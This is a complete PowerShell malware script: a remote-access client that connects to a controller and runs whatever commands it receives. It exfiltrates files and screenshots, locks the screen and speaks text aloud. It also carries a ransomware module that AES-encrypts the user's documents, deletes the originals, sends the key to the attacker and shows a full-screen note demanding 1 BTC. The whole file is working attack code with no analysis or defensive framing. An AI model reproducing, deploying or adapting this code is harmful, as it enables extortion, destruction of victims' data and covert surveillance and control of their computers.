$ErrorActionPreference = 'SilentlyContinue'

function DisplayMessage()
{
    function GenFakeWalletAddr()
    {
        $randChars = @('1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','w','y','z')
        $walletString = ''
        while($walletString.length -lt 35)
        {
            $randIndex = Get-Random -Min 0 -Max 36
            $randChar = $randChars[$randIndex]
            $walletString += $randChar
        }
        return $walletString
    }
    $walletAddr = GenFakeWalletAddr

$Text = @'

                                        Oh no, it appears as though your files have been encrypted!


                                                                uuuuuuu
                                                            uu$$$$$$$$$$$uu
                                                        uu$$$$$$$$$$$$$$$$$uu
                                                        u$$$$$$$$$$$$$$$$$$$$$u
                                                        u$$$$$$$$$$$$$$$$$$$$$$$u
                                                       u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                                       u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                                       u$$$$$$"   "$$$"   "$$$$$$u
                                                      "$$$$"      u$u       $$$$"
                                                        $$$u       u$u       u$$$
                                                        $$$u      u$$$u      u$$$
                                                         "$$$$uu$$$   $$$uu$$$$"
                                                          "$$$$$$$"   "$$$$$$$"
                                                            u$$$$$$$u$$$$$$$u
                                                             u$"$"$"$"$"$"$u
                                                  uuu        $$u$ $ $ $ $u$$       uuu
                                                  u$$$$       $$$$$u$u$u$$$       u$$$$
                                                 $$$$$uu      "$$$$$$$$$"     uu$$$$$$
                                                u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
                                                $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
                                                """      ""$$$$$$$$$$$uu ""$"""
                                                        uuuu ""$$$$$$$$$$uuu
                                                u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
                                                $$$$$$$$$$""""           ""$$$$$$$$$$$"
                                                "$$$$$"                      ""$$$$""
                                                  $$$"                         $$$$"


                                            Follow these instructions to recover your data:
                                            ----------------------------------------------
                                            1) Send 1 BTC to: {0}
                                            2) Wait for confirmation and decryption

'@ -f $walletAddr

    Add-Type -AssemblyName System.Windows.Forms

    $Label = New-Object System.Windows.Forms.Label
    $Label.TabIndex = 1
    $Label.Text = $Text
    $Label.ForeColor = 'Lime'
    $Label.AutoSize = $True
    $Label.Font = "Lucida Console, 16pt, style=Regular"
    $Label.Location = '0, 30'

    $Form = New-Object system.Windows.Forms.Form
    $Form.AutoSize()
    $Form.Controls.Add($Label)
    $Form.WindowState = 'Maximized'
    $Form.FormBorderStyle = 'None'
    $Form.BackColor = "#FF000000"
    $Form.Cursor=[System.Windows.Forms.Cursors]::WaitCursor
    $Form.ShowDialog()
}

function ScreenShot()
{
    [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null

    function screenshot([Drawing.Rectangle]$bounds, $path) 
    {
        $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
        $bmp.Save($path)
        $graphics.Dispose()
        $bmp.Dispose()
    }

    $query = Get-CIMInstance -ClassName Win32_VideoController
    $x_sum = 0
    $y_sum = 0
    $query | Foreach-Object {
                                $x = $_.CurrentHorizontalResolution
                                $y = $_.CurrentVerticalResolution 
                                if($x -and $y)
                                {
                                    $x_sum += $x 
                                    $y_sum += $y
                                }

                            }
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $x_sum, $y_sum)
    $computerName = $env:COMPUTERNAME
    $dateTime = Get-Date -Format "MM_dd_yyyy_hh_mm_ss"
    $imageTitle = "Screen_Shot_"+$computerName+'_'+$dateTime+"_.jpg"
    screenshot $bounds ".\$imageTitle"
    $image_path = (Get-ChildItem $imageTitle).FullName
    return $image_path
}

function EncryptFS()
{
    $extensions = @('.doc','.docx','.odt',
                '.xlsx','.pdf','.xls',
                '.db','.sql','.mdb',
                '.accdb','.dwg','.html',
                '.css','.js','.xhtml',
                '.zip','.gz','.7z',
                '.bak','.tmp','.txt',
                '.jpg','.png','.avi',
                '.mp3','.mp4','.xml',
                '.pptx','.ppt','.csv',
                '.dat','.odt','.bat',
                '.lnk','.url','.ps1',
                '.exe','.msi','.conf')

    $prng   = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $key    = [System.Byte[]]::new(32) 
    $prng.GetBytes($key)
    $cur_path  = (Get-Location).Path
    $filename  = 'aes.key'
    $key_path  = $cur_path+"\"+$filename
    $key | Out-File -FilePath $key_path 
    $iv  = [System.Byte[]]::new(16)
    $prng.GetBytes($iv)
    $cipher.Key = $key
    $cipher.IV  = $iv
    Get-ChildItem -Path C:\Users\$env:USERNAME -Recurse -File -ErrorAction 'SilentlyContinue' | Foreach-Object {
                                                                        
                                                                            $current_file = $_.FullName

                                                                            $current_ext  = '.'+$_.Name.Split('.')[1]

                                                                            if((Get-ChildItem $_.FullName) -is [System.IO.FileInfo])
                                                                            {
                                                                                if(($current_file -ne $MyInvocation.MyCommand.Source) -and ($current_file -ne $key_path) -and ($current_ext -in $extensions))
                                                                                {
                                                                                    try
                                                                                    {
                                                                                        $new_file_name = $current_file+'.enc'
                                                                                        $file_content  = [System.IO.File]::ReadAllBytes($current_file)
                                                                                        $cipher_obj    = $cipher.CreateEncryptor()
                                                                                        $enc_bytes     = $cipher_obj.TransformFinalBlock($file_content, 0, $file_content.Length)
                                                                                        [byte[]]$enc_bytes_iv   = $cipher.IV+$enc_bytes
                                                                                        $ciphertext    = [System.Convert]::ToBase64String($enc_bytes_iv)
                                                                                        Set-Content -Path $new_file_name -Value $ciphertext 
                                                                                        Remove-Item $_.FullName
                                                                                    }
                                                                                    catch
                                                                                    {
                                                                                        continue
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
    $cipher.Dispose()
    $prng.Dispose()
    return $key_path
}

function DecryptFS()
{
    if(!(Test-Path "aes.key"))
    {
        return
    }
    $key        = Get-Content "aes.key"
    $cipher     = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cipher.Key = $key
    Get-ChildItem -Path C:\Users\$env:USERNAME -Recurse -File -ErrorAction 'SilentlyContinue' | Foreach-Object {

                                                                        $current_file = $_.FullName 

                                                                        if(($current_file | Select-String '.enc') -and ($current_file -ne 'aes.key'))
                                                                        {
                                                                            try
                                                                            {
                                                                                $current_path        = (Get-ChildItem $current_file).FullName     
                                                                                $current_file_name   = (Get-ChildItem $current_file).Name     
                                                                                $path_segments       = $current_path.Split('\')
                                                                                $write_path          = ''
                                                                                $value               = $path_segments[0] 
                                                                                $iter                = 0
                                                                                while($value -ne $current_file_name)
                                                                                {
                                                                                    $write_path += $value
                                                                                    $write_path += '\'
                                                                                    $iter       += 1
                                                                                    $value       = $path_segments[$iter]
                                                                                }
                                                                                $segments            = $current_file_name.Split('.')
                                                                                $decrypted_file_name = $segments[0]+"."+$segments[1]
                                                                                $ct_file_content = Get-Content $current_file
                                                                                $ct_file_content = [System.Convert]::FromBase64String($ct_file_content)
                                                                                $cipher.IV       = $ct_file_content[0..15]
                                                                                $decipher_obj    = $cipher.CreateDecryptor()
                                                                                $plaintext  = $decipher_obj.TransformFinalBlock($ct_file_content, 16, $ct_file_content.Length-16)
                                                                                $decrypted_file_path = $write_path+'\'+$decrypted_file_name
                                                                                Set-Content -Path $decrypted_file_path -Value $plaintext -Encoding Byte
                                                                                Remove-Item $current_file
                                                                            }
                                                                            catch
                                                                            {
                                                                                continue
                                                                            }
                                                                        }
                                                                    }
    $cipher.Dispose()
}

function PSClient($addr,$port)
{
    try
    {
        $s = New-Object Net.Sockets.TcpClient($addr,$port)
    }
    catch
    {
        return 
    }

    while($s.Connected)
    {
            $stream      = $s.GetStream()
            $transmitter = New-Object System.IO.StreamWriter($stream)
            $receiver    = New-Object System.IO.StreamReader($stream)
            $intake      = $receiver.ReadLine()
            if($intake)
            {
                if($intake | Select-String 'send')
                {
                    $filename = $intake.Split('#')[1] 
                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
                    $current_location = (Get-Location).Path
                    $out_path         = $current_location+'\'+$filename
                    Set-Content -Path $out_path -Value $content -Encoding Byte
                    continue
                }
                if($intake | Select-String 'download')
                {
                    $fileName = $intake.Split(' ')[1]
                    if(Test-Path $fileName)
                    {
                        $filename = Split-Path $filename -leaf
                        $data = Get-Content $filename -Encoding Byte
                        $data = [System.Convert]::ToBase64String($data)
                        $transmitter.WriteLine($data)
                        $transmitter.Flush()
                        continue
                    }
                    else 
                    {
                        $response = '[!] Failed to download file '
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                        continue
                    }
                }
                if($intake | select-String 'encryptfs')
                {
                    $key_path = EncryptFS
                    $data     = Get-Content $key_path -Encoding Byte
                    $data     = [System.Convert]::ToBase64String($data)
                    $transmitter.WriteLine($data)
                    $transmitter.Flush()
                    Remove-Item $key_path
                    continue
                }
                if($intake | Select-String 'decryptfs')
                {
                    $filename = $intake.Split('#')[1] 
                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
                    Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                    DecryptFS
                    Remove-Item $filename
                    Get-Process | Where-Object { ($_.ProcessName -eq 'powershell') -and ($_.Id -ne $PID)} | Stop-Process -ErrorAction SilentlyContinue
                    continue
                }
                if($intake | Select-String 'screenshot')
                {
                    $image = ScreenShot
                    if(Test-Path $image)
                    {
                        $filename = Split-Path $image -leaf 
                        $data = Get-Content $filename -Encoding Byte
                        $data = [System.Convert]::ToBase64String($data)
                        $transmission = "$filename#$data" 
                        $transmitter.WriteLine($transmission)
                        $transmitter.Flush()
                        Remove-Item $image
                        continue
                    }
                    else 
                    {
                        $response = '[!] Failed to locate screenshot '
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($response)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                        continue
                    }

                }
                if($intake | Select-String 'speak')
                {
                    $segments     = $intake.Split('#')[1]
                    $segments     = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($segments))
                    $segments     = $segments.Split('#')
                    $transmission = ''

                    for($i = 0; $i -lt $segments.Length; $i++)
                    {
                        $transmission += $segments[$i]
                        $transmission += ' '
                    }

                    Add-Type -AssemblyName System.Speech
                    $speakObject = New-Object System.Speech.Synthesis.SpeechSynthesizer
                    $speakObject.SelectVoice('Microsoft Zira Desktop')
                    $speakObject.Volume = 100
                    $speakObject.Rate   = -3
                    $speakObject.Speak($transmission)
                    continue
                }
                if($intake | Select-String 'lockscreen')
                {
                    try
                    {
                        rundll32.exe user32.dll,LockWorkStation
                        $response = '[*] Locked the screen of the remote host'
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($response)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                        continue
                    }
                    catch 
                    {
                        continue
                    }
                }
                if($intake | Select-String 'staticmessage')
                {
                    Start-Process powershell -args '-noprofile', '-noexit', '-windowstyle hidden', '-EncodedCommand',
                    ([Convert]::ToBase64String(
                       [Text.Encoding]::Unicode.GetBytes(
                         (Get-Command -Type Function DisplayMessage).Definition
                       )
                    ))
                    $response = '[*] Displayed message on the remote host'
                    $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                    $response = [Convert]::ToBase64String($response)
                    $transmitter.WriteLine($response)
                    $transmitter.Flush()
                    continue
                }
                if($intake | Select-String 'menu')
                {
                    continue
                }
                else 
                {
                    if($intake -ne $null)
                    {
                        $decoded_intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                        $cmd                 = $decoded_intake
                        if($cmd | Select-String 'exit')
                        {
                            try
                            {
                                Get-Process | Where-Object { $_.ProcessName -eq 'powershell' } | Stop-Process
                            }
                            catch
                            {
                                continue
                            }
                            $transmitter.Dispose()
                            $receiver.Dispose()
                            $s.Close()
                            exit
                        }
                        $result              = Invoke-Expression $cmd | Out-String 
                        $result              = [System.Text.Encoding]::Unicode.GetBytes($result)
                        $result              = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($result)
                        $transmitter.Flush()
                    }
                }
            }
    }
}

PSClient localhost 8080